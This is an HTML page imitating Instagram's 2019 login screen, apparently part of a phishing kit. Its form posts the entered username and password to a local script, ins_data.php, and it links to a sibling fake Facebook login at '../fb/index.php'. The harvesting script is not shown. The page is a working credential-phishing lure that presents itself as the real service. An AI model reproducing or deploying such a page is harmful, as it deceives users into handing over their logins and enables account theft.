<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
  <link rel="icon" href="./images/insta.png">
  <link rel="stylesheet" href="style.css">
  <title>Instagram Login Form</title>
</head>

<body>

  <div id="wrapper">
    <div class="container">
      <div class="phone-app-demo"></div>
      <div class="form-data">



        <form action="ins_data.php" method="POST">
          <div class="logo">
            <img src="./images/logo.png" alt="logo">
          </div>
          <input type="text" name="nam" placeholder="Phone number, username, or email">
          <input type="password" name="pass" placeholder="Password">
          <button class="form-btn" type="submit">Log in</button>
          <span class="has-separator">Or</span>
          <a class="facebook-login" href="../fb/index.php">
            <i class="fab fa-facebook-square"></i> Log in with Facebook
          </a>
          <a class="password-reset" href="#">Forgot password?</a>
        </form>



        <div class="sign-up">
          Don't have an account? <a href="#">Sign up</a>
        </div>
        <div class="get-the-app">
          <span>Get the app.</span>
          <div class="badges">
            <img src="./images/app-store.png" alt="app-store badge">
            <img src="./images/google-play.png" alt="google-play badge">
          </div>
        </div>
      </div>
    </div>

    <footer>
      <div class="container">
        <nav class="footer-nav">
          <ul>
            <li>
              <a href="#">About us</a>
            </li>
            <li>
              <a href="#">Support</a>
            </li>
            <li>
              <a href="#">Press</a>
            </li>
            <li>
              <a href="#">Api</a>
            </li>
            <li>
              <a href="#">Jobs</a>
            </li>
            <li>
              <a href="#">Privacy</a>
            </li>
            <li>
              <a href="#">Terms</a>
            </li>
            <li>
              <a href="#">Directory</a>
            </li>
            <li>
              <a href="#">Profiles</a>
            </li>
            <li>
              <a href="#">Hashtags</a>
            </li>
            <li>
              <a href="#">Languages</a>
            </li>
          </ul>
        </nav>
        <div class="copyright-notice">
          &copy 2019 Instagram
        </div>
      </div>
    </footer>

  </div>

</body>

</html>